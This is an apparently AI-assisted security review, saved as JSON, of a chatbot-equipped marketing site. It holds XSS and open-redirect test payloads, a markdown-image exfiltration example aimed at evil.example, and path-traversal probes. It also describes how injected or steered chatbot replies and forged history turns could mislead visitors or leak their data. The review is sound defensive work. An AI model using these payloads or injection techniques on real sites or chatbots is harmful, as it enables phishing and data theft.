@@ -1,0 +1,102 @@
+{
+  "schema": "vantry.review/1",
+  "kind": "security",
+  "verdict": "pass",
+  "reviewer": "security-engineer",
+  "at": "2026-11-24T19:04:16Z",
+  "head": "cf26127c83d58ab99aeb50b96dcf0c4b68bf91df",
+  "base": "0ff06a825873ad1959b73421f0b4b3a98b97a26a (develop, Sprint 1 release, reviewed PASS in develop.security.json)",
+  "scope": "integrate/s2 = 0ff06a8..cf26127 (135 files): STS-049 build guard, STS-023 images, STS-020/047/022 SSR prerender (tools/prerender.mjs, src/entry-server.tsx, preview plugin in vite.config.ts), STS-048 self-hosted fonts + CSP, STS-021 SEO head injection, STS-030 business config, STS-031 home, STS-038 header/footer, STS-058 chatbot (link policy, facts from config, fetch fix that makes POST /api/chat live). Static SPA on Cloudflare Pages; backend repo out of scope.",
+  "sensitive_paths_hit": ["src/services/**", "src/pages/Contact.tsx", "public/_headers", "index.html", "vite.config.ts", "package.json", "package-lock.json", ".github/workflows/**"],
+  "precondition": "Per orchestrator instruction scripts/verify.sh was NOT run by the reviewer; the verified build at wt-fe-s2-int/dist (worktree HEAD = cf26127, clean tree) was read. The reviewer independently executed the security-relevant test suites and a canary build in an isolated scratch copy of cf26127 (see evidence).",
+  "threat_model": "none: cf26127 contains no docs/security/ at all (carry-over info finding from develop review, still open; more pressing now that /api/chat is live).",
+  "checklist": ["data-authz", "privileged-credential", "boundary-validation", "secrets-pii", "webhooks", "storage", "headers-csp", "ai-context", "owasp-top-10"],
+  "evidence": {
+    "data-authz": "N/A: no database, table, policy or query in the SPA. /auth and /dashboard stay unrouted (src/routes.tsx APP_ROUTES); App.routes.test.tsx deny + allow executed 3/3 pass.",
+    "privileged-credential": "No provider key, 'openai' SDK import, dangerouslyAllowBrowser or api.openai.com in src or dist. dist (22 HTML pages + 2 JS chunks + CSS) grep for sk-/sk-proj-/AKIA/AIza/ghp_/whsec_/pk_live_/sk_live_/JWT/PEM/service_role/OPENAI/supabase = 0 files; 0 source maps; only env reads are VITE_API_URL and VITE_SITE_URL; only network endpoints are ${VITE_API_URL}/api/chat and /api/contact. Canary build of cf26127 with VITE_CANARY_SECRET and VITE_OPENAI_API_KEY set to canary values: 0 occurrences in output (see low finding on seo.ts:24 for why this was tested).",
+    "boundary-validation": "openai.service.ts: message trimmed + capped 1000, history <=10 x 2000, roles filtered to user|assistant, body exactly {message, history}; success requires 2xx + application/json + success===true + non-empty string reply. The only behavioural change is fetcher() wrapping the global fetch in an arrow function (line 54) - no change to what is sent. openai.service.test.ts 12/12 pass. Contact form submit path (src/lib/contact-submit.ts) is unchanged; Contact.tsx only swaps hard-coded facts for config helpers. Contact.test.tsx 14/14 pass. Authoritative validation remains the backend's.",
+    "secrets-pii": "No console statement logs a visitor message, contact field or response body (chatbot.service.ts logs only the failure class; ErrorBoundary.tsx:25 logs the render error to the console and shows a fixed fallback). Chat UI carries a privacy notice (AminaChatbot.tsx:362-363). Unverified business facts: dist grep for the old phone (783-0443), street (2765 / Hamilton / 43232), info@/contact@ emails, @sarayatech / linkedin = 0. The only remaining unverified value is the Calendly URL as an inert string in the business config object (index-*.js), gated by booking.verified=false and never rendered as a link (consumers.test.tsx + chatbot-facts.test.ts pass).",
+    "webhooks": "N/A: no webhook receiver in a static SPA.",
+    "storage": "N/A: no upload or storage access. New images are static files under public/images.",
+    "headers-csp": "public/_headers diff only removes fonts.googleapis.com / fonts.gstatic.com and data: from style-src/font-src (a tightening). Built CSS @font-face uses /assets/*.woff2 only; built index.html preloads /assets/poppins-*.woff2 (Vite rewrote the /node_modules/ preload href). All 22 prerendered pages carry exactly one script tag, the external module /assets/index-*.js; no inline script, no __staticRouterHydrationData, so script-src 'self' still fits. tests/headers.test.mjs 5/5 pass. Still Report-Only (accepted risk carried over).",
+    "ai-context": "Bot replies render through react-markdown 10 with no rehype-raw; reviewer payload '<img src=x onerror=alert(1)> <script>alert(1)</script> <a href=\"javascript:alert(1)\">' rendered as escaped text. [x](javascript:...), JAVASCRIPT:, data:, java<TAB>script:, reference-style javascript: links all rendered as <span data-unlinked>. classifyHref fuzz (52 payloads): //, /\\, \\\\, \\/, leading space, NUL, TAB, LF, uppercase schemes, data:, vbscript:, https:evil, https:/evil, https:\\\\evil, userinfo, fullwidth solidus, U+2215, NBSP, U+2028, BOM all classified safely - EXCEPT dot-segment paths, see the medium finding. Facts in local answers come only from src/config/business.ts via chatbot-facts.ts. Provider key, model, system prompt and token caps are server-side.",
+    "owasp-top-10": "XSS in prerender/head: renderHeadTags escapes & < > \" in every text and double-quoted attribute; reviewer test with title/description/path/siteUrl = '\"><script>alert(1)</script><img src=x onerror=alert(2)> $& $\\' $` </title></head>' produced zero live tags and one <title>. inject()/injectHead() use replacement functions, so $& / $' / $` in app HTML or head are inserted literally (tested). All prerender inputs are build-time constants (route table, SOLUTIONS_DATA, industries); getSeo() on hostile client paths (/solutions/__proto__, /constructor, %3Cscript%3E, malformed %E0%A4%A) returns the static 404 data (hasOwnProperty lookup). Client head updates use setAttribute/document.title only. dangerouslySetInnerHTML: only src/components/ui/chart.tsx:70 (unused, unchanged). Hydration: entry-server.test.tsx 'hydrates the prerendered markup without a mismatch' passes. Open redirect: see medium finding. Dependencies: npm audit --omit=dev on base and head lockfiles is identical (react-router x2 moderate, zod high - all triaged in the develop review); full audit identical (10). New packages @fontsource/poppins (runtime, fonts only) and sharp + @img/* + detect-libc + @emnapi/runtime (dev, image tooling), all resolved from registry.npmjs.org. The react-router SSR deserializeErrors advisory stays unreachable: SSR is build-time StaticRouter with no hydration data emitted. Workflow change: verify.yml adds VITE_API_URL=http://localhost:3001 as a placeholder env, no secret, no new trigger or permission."
+  },
+  "findings": [
+    {
+      "severity": "medium",
+      "file": "src/components/chatbot/links.ts",
+      "line": 47,
+      "introduced_by_this_diff": true,
+      "summary": "The link policy can be bypassed with dot segments, and this diff introduced the bypass. classifyHref accepts '/.//evil.example', '/..//evil.example', '/a/..//evil.example', '/%2e//evil.example' and '/./\\evil.example' as INTERNAL, because the first character after '/' is not '/' or '\\'. It then returns the normalised url.pathname, which the WHATWG parser reduces to '//evil.example'. MarkdownRenderer.tsx:47 writes that value into <a href>. A protocol-relative href resolves to https://evil.example/. Executed in jsdom: the rendered href is '//evil.example', with no target, no new-tab marker and no external-link styling. A plain left click is accidentally safe, because react-router collapses '//' and pushState received '/evil.example'. But a middle-click, a Ctrl/Cmd/Shift-click (the handler deliberately returns early for these, MarkdownRenderer.tsx:28), 'open in new tab' or a copied link lands on the attacker's host. Attack: a reply the visitor steered, or one shaped by an indirect prompt injection, presents an off-site phishing link as a same-site internal link. That defeats the stated guarantee of SEC-16/REQ-154 that 'internal' stays on this origin. On develop (0ff06a8) the raw href '/.//evil.example' resolved same-origin (https://sarayatechsolutions.com//evil.example), so this is a regression. links.test.ts has 30 cases and none covers dot segments.",
+      "evidence": "node on the worktree links.ts: classifyHref('/.//evil.com') -> {kind:'internal', href:'//evil.com'}; same for '/..//evil.com', '/a/..//evil.com', '/%2e//evil.com', '/%2e%2e//evil.com' and '/./' + backslash + 'evil.com'. vitest + jsdom, BrowserRouter + MarkdownRenderer content '[Book a call](/.//evil.example)': renderedHref='//evil.example', resolved='https://evil.example/', target=null.",
+      "fix": "In classifyHref, after the URL is resolved, reject any normalised result that leaves the single-slash form. Replace line 47 with: `const path = url.pathname; if (/^[/\\\\]{2}/.test(path)) return { kind: \"text\" }; return { kind: \"internal\", href: `${path}${url.search}${url.hash}` };`. Rendering it as text is preferable to re-classifying it as external, because a dot-segment off-site link is never legitimate. Add links.test.ts cases for all six payloads above, expecting kind 'text' with no off-origin href. Also add a MarkdownRenderer test asserting that no rendered <a> has an href that resolves (new URL(href, location.href).origin) to a foreign origin unless it carries target=_blank.",
+      "recommendation": "Fix before the develop -> main release PR. Two lines plus tests. It does not block integrate/s2 -> develop under the CRITICAL/HIGH rule."
+    },
+    {
+      "severity": "low",
+      "file": "src/components/chatbot/MarkdownRenderer.tsx",
+      "line": 37,
+      "introduced_by_this_diff": false,
+      "summary": "This predates the diff and is unchanged by it. react-markdown renders images by default and the renderer has no img override, so a bot reply containing '![x](https://evil.example/p.png?d=...)' makes the visitor's browser fetch an arbitrary remote URL with no click. That is the classic markdown-image exfiltration channel: an injected reply can encode conversation content (which may include the visitor's name or email) into the query string. The CSP img-src ('self' data: blob: https://i.pravatar.cc) would block it, but the CSP is Report-Only. Reviewer test: the reply rendered <img src=\"https://evil.example/t.png\">. This diff hardened links (SEC-16) and left this sibling sink open.",
+      "fix": "Add `img: ({ alt }) => <span data-unlinked=\"\">{alt}</span>` to the components map, or pass `disallowedElements={['img']} unwrapDisallowed` to <Markdown>. Add a test asserting that no <img> is rendered from a reply.",
+      "recommendation": "Bundle with the medium fix above."
+    },
+    {
+      "severity": "low",
+      "file": "src/seo/seo.ts",
+      "line": 24,
+      "introduced_by_this_diff": true,
+      "summary": "`import.meta.env?.VITE_SITE_URL` uses optional chaining, so Vite cannot statically replace the member access. It materialises the whole import.meta.env object (every VITE_* variable in the build environment) and relies on Rollup's object-property tree-shaking to drop the unused keys. The emitted bundle has `qu={}`, `qu==null?void 0:qu.VITE_SITE_URL`. Today nothing leaks: the reviewer's canary build with VITE_OPENAI_API_KEY and VITE_CANARY_SECRET set produced 0 occurrences. But that protection depends on optimiser behaviour, and the develop review recorded that a VITE_OPENAI_API_KEY may still sit in the Cloudflare Pages build environment.",
+      "fix": "Use the static form `import.meta.env.VITE_SITE_URL as string | undefined`. Vite then substitutes only that one key, which is what openai.service.ts:45 already does. If the SSR/test path needs a guard, use `typeof import.meta.env !== 'undefined' ? import.meta.env.VITE_SITE_URL : undefined`. Separately (ops), delete VITE_OPENAI_API_KEY from the Cloudflare Pages environment as the develop review required.",
+      "recommendation": "Small chore; do it with the next seo.ts touch."
+    },
+    {
+      "severity": "info",
+      "file": "vite.config.ts",
+      "line": 15,
+      "introduced_by_this_diff": true,
+      "summary": "servePrerenderedRoutes calls existsSync(path.resolve(__dirname, 'dist', '.' + pathname, 'index.html')) on the raw, un-normalised req.url. That makes it a directory-existence oracle outside dist. Executed against a loopback `vite preview` of a scratch copy: '/../outside' (a sibling directory with an index.html) returned 404, while '/../nonexistent' returned 200 (the SPA shell). '/../../outside2' vs '/../../nonexist2' behaved the same way. No file content outside dist was ever served, because sirv still confines reads; '/..%2foutside', '/%2e%2e/outside', '/x/../../outside2' and '/../package.json' all returned the dist shell. Preview binds to localhost by default (server.host), and preview is never used in production (Cloudflare Pages serves dist).",
+      "fix": "Resolve, then confine: `const distDir = path.resolve(__dirname, 'dist'); const target = path.resolve(distDir, '.' + clean); if (!target.startsWith(distDir + path.sep)) return next();` before the existsSync check, or reject any pathname containing a '..' segment.",
+      "recommendation": "Optional hardening."
+    },
+    {
+      "severity": "info",
+      "file": "src/services/openai.service.ts",
+      "line": 54,
+      "introduced_by_this_diff": true,
+      "summary": "With the fetch fix, visitor messages and a client-held history reach the backend POST /api/chat, and from there the AI provider, for the first time. The frontend side is sound: it sends the capped {message, history}, shows a privacy notice, and logs no PII. Three properties now matter and only the backend can enforce them. (1) `history` is client-controlled: anyone can POST forged 'assistant' turns to prime the model, so the server must treat every history turn as untrusted and re-apply its caps. (2) Rate and cost limits must hold per IP/session. (3) The backend system prompt or knowledge base must be stripped of the unverified facts this diff removed from the frontend (old street address, phone, emails, Calendly), or the LLM will restate them. The frontend cannot prevent (3).",
+      "fix": "Backend review: confirm server-side Zod validation of {message, history}, role allowlist, caps, rate limit and token cap on /api/chat. Grep the backend prompt and KB for '2765', '783-0443', 'calendly' and 'info@'. Run /threat-model for the chat boundary.",
+      "recommendation": "Track in the backend repo before enabling the chat in production."
+    },
+    {
+      "severity": "info",
+      "file": "tools/require-api-url.ts",
+      "line": 8,
+      "introduced_by_this_diff": true,
+      "summary": "The STS-049 guard accepts http://localhost / 127.0.0.1 in a production-mode build, and tools/build-verify.mjs injects http://localhost:3001 whenever VITE_API_URL is unset. If Cloudflare Pages were ever configured with `npm run build:verify` instead of `npm run build`, production would ship a bundle that POSTs visitor chat and contact data to whatever listens on the visitor's own localhost:3001. The verified dist contains exactly that placeholder, which is expected for verification only.",
+      "fix": "Keep the Cloudflare build command as `npm run build`. Optionally make assertApiUrl reject localhost when process.env.CF_PAGES === '1'.",
+      "recommendation": "Note in the deploy runbook."
+    },
+    {
+      "severity": "info",
+      "file": "docs/security/threat-models",
+      "line": 0,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over from the develop review and still open. There is no threat model, and cf26127 contains no docs/security/ at all, while this diff makes the AI chat boundary live.",
+      "fix": "Run /threat-model for the contact + chat boundary.",
+      "recommendation": "Before the backend chat goes live."
+    }
+  ],
+  "accepted_risks": [
+    "All accepted risks from develop.security.json carry over unchanged: the unrotated, previously exposed OpenAI key (human action); dev/test-only dependency advisories; react-router moderate advisories (open-redirect class mitigated by classifyHref, subject to the medium finding above); CSP in Report-Only mode; dead Auth/Dashboard/chart files.",
+    "The unverified Calendly URL is present as an inert string in the client bundle (src/config/business.ts:56, booking.verified=false), by design, so the owner can flip one flag. It is never rendered or linked (tested), and it is not a secret.",
+    "External https links in bot replies still open in a new tab to any host (develop info finding); the link policy now normalises them and strips every other scheme.",
+    "The medium dot-segment finding is accepted for the integrate/s2 -> develop merge only, on condition that it is fixed and re-reviewed before the develop -> main release."
+  ],
+  "tests_executed_by_reviewer": {
+    "repo_suites": "vitest on an isolated scratch copy of cf26127 (node_modules junctioned from wt-fe-s2-int): src/components/chatbot (links 30, MarkdownRenderer 8, AminaChatbot 4), src/services (openai 12, chatbot 24, chatbot-facts 9), src/seo (31), Seo.test (2), entry-server (25), src/config (business 5, consumers 4), Contact (14), App.routes (3), tests/headers (5), tests/prerender (7), tests/require-api-url (8) = 191/191 pass in 16 files.",
+    "reviewer_probes": "classifyHref fuzz, 52 payloads plus 8 backslash variants (node type-stripping on worktree links.ts). jsdom MarkdownRenderer render-and-click for 5 dot-segment payloads, plus a raw-HTML/script/javascript:/data:/image reply. Head-injection escaping and $-pattern immunity, and getSeo on hostile paths (vitest). Canary-env client build (vite 5.4.21 / rollup 4.68.8). Loopback vite preview traversal probe, 13 + 4 URLs with curl --path-as-is. dist grep for secrets, env names, endpoints, unverified facts, inline scripts and source maps. npm audit (prod and full) on base vs head lockfiles."
+  },
+  "verdict_rationale": "No critical or high finding is introduced by this diff. The prerender and SEO head paths escape every value, all of their inputs are build-time constants, and the injection is immune to replacement patterns. The built site has no inline script, no secret and no source map, and it shows none of the removed unverified facts. The CSP change only tightens it. The dependency risk profile is unchanged. The one regression, a medium bypass of the chat link policy via dot segments (links.ts:47), is confirmed by execution. It needs a multi-click or new-tab action and a steered or injected bot reply, and it gives no script execution. Under the stated CRITICAL/HIGH gate it does not fail this merge, but it must be fixed, with tests, before the develop -> main release."
+}
